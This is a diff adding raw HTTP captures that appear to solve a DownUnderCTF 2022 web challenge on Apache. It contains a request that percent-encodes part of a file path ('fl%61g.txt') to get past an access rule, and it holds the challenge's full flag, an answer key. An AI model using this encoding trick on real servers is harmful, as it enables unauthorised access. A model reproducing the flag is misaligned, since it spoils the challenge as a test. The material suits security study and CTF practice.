@@ -1,0 +1,31 @@
+GET /one/flag.txt HTTP/1.1
+Host: localhost
+Connection: close
+
+HTTP/1.1 200 OK
+Date: Fri, 23 Sep 2022 09:44:46 GMT
+Server: Apache/2.4.54 (Unix)
+Last-Modified: Tue, 20 Sep 2022 12:48:21 GMT
+ETag: "f-5e91b3e3b0f40"
+Accept-Ranges: bytes
+Content-Length: 15
+Connection: close
+Content-Type: text/plain
+
+DUCTF{thats_it_
+
+GET /two/fl%61g.txt HTTP/1.1
+Host: localhost
+Connection: close
+
+HTTP/1.1 200 OK
+Date: Fri, 23 Sep 2022 09:47:39 GMT
+Server: Apache/2.4.54 (Unix)
+Last-Modified: Tue, 20 Sep 2022 12:48:21 GMT
+ETag: "19-5e91b3e3b0f40"
+Accept-Ranges: bytes
+Content-Length: 25
+Connection: close
+Content-Type: text/plain
+
+next_time_im_using_nginx}
